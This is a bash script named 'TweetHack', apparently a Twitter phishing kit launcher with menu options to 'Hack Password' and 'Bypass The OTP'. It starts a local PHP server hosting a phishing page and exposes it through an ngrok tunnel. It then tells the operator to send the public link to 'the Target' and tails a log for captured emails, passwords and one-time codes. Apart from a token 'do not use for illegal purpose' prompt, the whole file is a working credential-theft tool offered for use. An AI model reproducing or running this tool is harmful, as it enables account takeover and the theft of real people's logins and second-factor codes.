#!/bin/bash
clear
echo ""
echo ""
echo ""
printf "\e[1;33m| \e[1;33m             TweetHack Starting Plase Wait..                       |\e[0m"
echo""
sleep 6
echo ""
clear
echo ""
echo ""
echo ""
read -p $'\e[1;32m\e[0m\e[1;32m Do Not Use For Illegal Purpose Legal For (Yes) \e[1;33m\e[0m\e[1;33m (Y/N) : \e[0m' option
echo""
echo""
echo""

if [[ $option == *'N'* ]]; then
clear
exit
fi
if [[ $option == *'n'* ]]; then
clear
exit
fi

php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
kill -9 $php
kill -9 $ngrok
clear
chmod 777 Logo.sh
./Logo.sh

echo ""
echo ""

                 echo -e $'\e[1;33m[\e[0m\e[1;77m 1 \e[0m\e[1;33m]\e[0m\e[1;32m Hack Password\e[0m' 
                 echo -e $'\e[1;33m[\e[0m\e[1;77m 2 \e[0m\e[1;33m]\e[0m\e[1;32m Bypass The OTP \e[0m' 
                 echo ""
                 read -p $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m Enter Your Choice : \e[0m' option
		 case $option in
                        1) cd demo/
                            echo ""
                            echo -e $'\e[1;31m   \e[0m' 
                            echo -e $'\e[1;31m[\e[0m\e[1;31m+\e[0m\e[1;31m]\e[0m\e[1;32m    PHP Server Starting \e[0m'
                             echo -e $'\e[1;31m  \e[0m'
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 3
                            echo " "
                            echo -e $'\e[1;31m[\e[0m\e[1;31m+\e[0m\e[1;31m]\e[0m\e[1;32m    Ngrok Server Starting \e[0m' 
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 25
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                            printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                            echo ""
                            echo -e $'\e[1;33m\e[0m\e[1;33m Target Infomation \e[0m'
                            echo ""
                            tail -f log.txt | grep -e "email" -e "password" -e "otp" 
                ;;

                
                         2) cd advanced/
                            echo ""
                            echo -e $'\e[1;31m \e[0m' 
                            echo -e $'\e[1;31m[\e[0m\e[1;31m+\e[0m\e[1;31m]\e[0m\e[1;32m PHP Server Starting... \e[0m'
                            echo -e $'\e[1;31m \e[0m' 
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 3
                            echo ""
                            echo -e $'\e[1;31m[\e[0m\e[1;31m+\e[0m\e[1;31m]\e[0m\e[1;32m   Ngrok Server Startig...\e[0m' 
                            
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 25
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                            printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                            echo ""
                            echo -e $'\e[1;33m\e[0m\e[1;33m Target Infomation  \e[0m'
                            echo ""
                            tail -f log.txt | grep -e "email" -e "password" -e "otp"
                ;;
               esac
                ;;
